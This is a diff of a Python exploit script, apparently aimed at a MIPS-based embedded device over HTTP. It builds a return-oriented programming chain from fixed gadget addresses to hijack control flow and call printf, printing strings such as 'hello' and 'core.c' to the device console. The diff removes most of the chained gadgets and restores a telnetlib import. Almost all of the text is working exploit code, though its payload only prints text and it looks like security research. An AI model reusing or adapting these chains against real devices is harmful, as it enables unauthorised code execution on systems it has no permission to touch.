@@ -1,6 +1,6 @@
 import base64
 import socket
-#import telnetlib
+import telnetlib
 import argparse
 from cmds import command_dict
 import time
@@ -481,65 +481,13 @@ elif args.command == 'http':
         config_get_addr = 0x800089e4
 
         # Build the ROP chain
-        if (args.rop[0] == '1'): # print 'hello_core.con' to uart/telnet command line
+        if (args.rop[0] == '1'): # print 'hello' to uart/telnet command line
             ## print 'hello'
             # Add the strings to the sX registers, and set the ra to first gadget
             chain += p32(0x801d3754) # s0 ('hello')
             chain += p32(0x801c3f91) # s1 ("%s")
             chain += p32(0xdeadbeef) # s2
             chain += p32(0xdeadbeef) # s3
-            chain += p32(0x12ba10 + base_address) # ra
-            
-            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0x187a30 + base_address) # ra
-
-            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += b'a'*4
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0x57864 + base_address)
-
-            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += p32(0x8019a3a0) # v0 - printf address
-            chain += b'a' * 8
-            chain += p32(0x15114 + base_address) # ra
-
-            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            chain += b'a' * 4
-            chain += p32(0x13478 + base_address) # ra
-
-            ## print 'core.c'
-            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += b'b' * 4
-            chain += p32(0x801d8faf) # s0 ('core.c')
-            chain += p32(0x801c3f91) # s1 ("%s")
-            chain += p32(0x12ba10 + base_address) # ra
-            
-            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0x187a30 + base_address) # ra
-
-            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += b'a'*4
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0x57864 + base_address)
-
-            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += p32(0x8019a3a0) # v0 - printf address
-            chain += b'a' * 8
-            chain += p32(0x15114 + base_address) # ra
-
-            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            chain += b'a' * 4
-            chain += p32(0x13478 + base_address) # ra
-
-            ## print 'on'
-            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
-            chain += b'b' * 4
-            chain += p32(0x801dcd98+0xa) # s0 ('on')
-            chain += p32(0x801c3f91) # s1 ("%s")
             chain += p32(0x12ba10 + base_address) # ra
             
             # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
